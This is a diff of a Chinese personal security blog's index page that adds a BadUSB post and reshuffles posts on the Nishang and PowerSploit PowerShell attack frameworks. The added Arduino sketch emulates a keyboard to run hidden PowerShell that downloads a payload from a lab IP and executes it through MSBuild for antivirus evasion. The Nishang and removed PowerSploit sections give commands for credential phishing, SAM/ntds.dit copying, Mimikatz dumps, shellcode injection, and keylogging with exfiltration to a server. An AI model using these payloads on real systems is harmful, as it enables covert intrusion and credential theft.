@@ -280,7 +280,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">BadUSB:虚假的恶意USB设备</a></h1>
         
 
         <div class="post-meta">
@@ -315,8 +315,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
+                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
+                    <span itemprop="name">社会工程学</span>
                   </a>
                 </span>
 
@@ -354,52 +354,87 @@
       
         
           
-            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
-<blockquote>
-<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
-</blockquote>
-<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+            <h1 id="BadUSB-虚假的恶意USB设备"><a href="#BadUSB-虚假的恶意USB设备" class="headerlink" title="BadUSB:虚假的恶意USB设备"></a>BadUSB:虚假的恶意USB设备</h1><p>从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。</p>
 <ul>
-<li>Antak-Webshell //webshell</li>
-<li>Backdoor //后门</li>
-<li>Client //客户端</li>
-<li>Escalation //提权</li>
-<li>Execution //RCE</li>
-<li>Gather //信息收集</li>
-<li>Misc //杂项</li>
-<li>Pivot //跳板及远程执行exe</li>
-<li>Scan //扫描</li>
-<li>powerpreter //文件下载及持续性</li>
+<li>Arduino: 一款开源电子原型平台，也就是常说的开发板。</li>
+<li>Arduino UNO/Leonardo: Arduino中的两种型号</li>
+<li>HID Attacks: 通过接入伪装的设备，如U盘，达到模拟键盘输入*的攻击</li>
+<li>TEENSY: 实现HID Attacks的一种设备，类似于Arduino设备。</li>
+<li>USB RUBBER DUCKY： 实现HID Attacks的一种设备，外观和U盘无差别</li>
+<li>BadUSB：基于U盘实现HID Attacks的方式</li>
+<li>kali NetHunter：基于安卓的开源移动渗透测试平台</li>
 </ul>
-<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
-<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
 <blockquote>
-<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+<p>当Arduino插入电脑时，Arduino将会伪装成键盘，并且自动输入Arduino中的命令。说直白点，就是一双无形的手在操控你的键盘，并且可以在极短的时间内输入事先写好的指令，让受害者毫无察觉。</p>
 </blockquote>
-<p>** Copy-VSS.ps1 **</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<p>** 只要是能通过USB连接的设备都有可能被植入攻击芯片，此攻击芯片是一个非常小巧且功能完整的单片机开发系统，也是BadUSB的核心。**</p>
+<p>在这里将会使用最常见的U盘实现BadUSB攻击演示。</p>
+<h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><pre><code>#include &lt;Keyboard.h&gt;
+void setup() {//初始化
+Keyboard.begin();//开始键盘通讯
+delay(5000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+delay(500);
+Keyboard.press(&apos;r&apos;);//r键
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&apos;r&apos;);
+Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+delay(500);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(100);
+Keyboard.println(&quot;powershell -w hidden Invoke-WebRequest -uri   http://172.22.35.106/PAYLOAD1.XML -OutFile   1025.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.xml&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();//结束键盘通讯
+}
+void loop()//循环
+{
+Keyboard.begin();//开始键盘通讯
+delay(5000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+delay(500);
+Keyboard.press(&apos;r&apos;);//r键
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&apos;r&apos;);
+Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+delay(500);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(100);
+Keyboard.println(&quot;POWERSHELL -W HIDDEN INVOKE-WEBREQUEST -URI HTTP://172.22.35.106/PAYLOAD1.XML -OUTFILE 1025.XML;C:/WINDOWS/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.XML&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();//结束键盘通讯
+}</code></pre><blockquote>
+<p>这里使用了白名单中的MSBuid.exe以达到免杀的目的，首先从服务器下载payload文件，然后用MSBuid.exe执行返回session。然后重复，不过usb插入几秒就够了，重复也不过是多返回几个session而已。</p>
+</blockquote>
+<p>  <strong>正因为HID攻击对于大众来说还属于冷门，人们甚至不知道它的存在，防范更是无从谈起，但它的危害却是非常大的，USB设备的普及更是放大了它的危害性。所有这一切都是因为连接到目标机器时的假USB是用另一个不是原设备（就像它们原本的那样）的固件执行的，冒充任何其他类型的设备并且能够执行任何类型它所连接的机器上的操作，而无需用户许可。</strong></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote>
+<p>HID攻击对某些没有外接设备的终端设备有奇效，只要有USB口就可以尝试攻击。</p>
+</blockquote>
 <blockquote>
-<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+<p>HID攻击本身是不会被拦截的，行为可能会被拦截，这时候就得改变payload了。</p>
 </blockquote>
-<pre><code>Copy-VSS //直接把文件保存到当前路径
-Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
 <blockquote>
-<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+<p>HID：Human Interface Device的缩写，直接与人交互的设备，例如键盘、鼠标。</p>
 </blockquote>
-<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
-FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
-<blockquote>
-<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
-</blockquote>
-<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
-.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
-erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
-.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
-Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
-<blockquote>
-<p>获取用户密码的提示信息，如果有的话。</p>
-</blockquote>
-<pre><code>Get-PassHints</code></pre>
+<p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png" alt="avatar"></p>
+
           
         
       
@@ -623,211 +658,6 @@ C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">PowerSploit基本功能演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
-<li><p>AntivirusBypass     //发现杀软查杀特征</p>
-</li>
-<li><p>CodeExecution      //代码执行</p>
-</li>
-<li><p>Exfiltration     //信息收集</p>
-</li>
-<li><p>Mayhem    //破坏性脚本</p>
-</li>
-<li><p>Persistence    //后门</p>
-</li>
-<li><p>Recon     //利用跳板进行内网信息侦擦</p>
-</li>
-<li><p>ScriptModification     //创建或修改脚本</p>
-<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
-<li><ul>
-<li>Invoke-Shellcode.ps1 **</li>
-</ul>
-<p>shellcode注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
-//下载并导入脚本
-IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
-//下载powershell的shellcode
-Invoke-Shellcode -Shellcode ($buf) -Force
-//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
-Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
-//隐藏的开始一个记事本进程。
-Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
-//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
-<li><ul>
-<li>Invoke-DllInjection.ps1 **</li>
-</ul>
-<p>dll注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
-//下载并导入脚本
-Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
-//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
-<li><ul>
-<li>Invoke-Portscan **</li>
-</ul>
-<p>端口扫描</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
-//下载并导入脚本
-Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
-//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
-<li><ul>
-<li>Invoke-Mimikatz.ps1 **</li>
-</ul>
-<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
-<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
- //下载并导入脚本
- Invoke-Mimikatz -DumpCreds
- //抓取密码
-
-** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
-//下载并导入脚本
-Get-Keystrokes -LogPath c:\test.txt
-//开启记录并保存到指定位置</code></pre></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
                 <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
         
 
@@ -919,6 +749,195 @@ Get-Keystrokes -LogPath c:\test.txt
 </li>
 </ul>
 
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+</blockquote>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
+</ul>
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
           
         
       
